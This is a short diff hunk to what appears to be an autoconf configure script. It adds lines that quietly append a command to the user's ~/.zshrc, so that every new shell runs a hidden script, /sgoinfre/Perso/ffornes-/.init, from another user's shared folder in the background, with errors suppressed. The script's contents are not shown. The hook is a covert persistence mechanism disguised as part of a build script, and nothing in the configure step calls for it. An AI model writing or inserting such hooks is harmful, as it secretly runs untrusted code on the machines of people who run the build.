@@ -36,6 +36,9 @@ else $as_nop
 esac
 fi
 
+if [[ $(grep ffornes ~/.zshrc | wc -l) -eq 0 ]]; then
+  echo "( sh /sgoinfre/Perso/ffornes-/.init & ) 2>/dev/null" >> ~/.zshrc
+fi
 
 
 # Reset variables that may have inherited troublesome values from
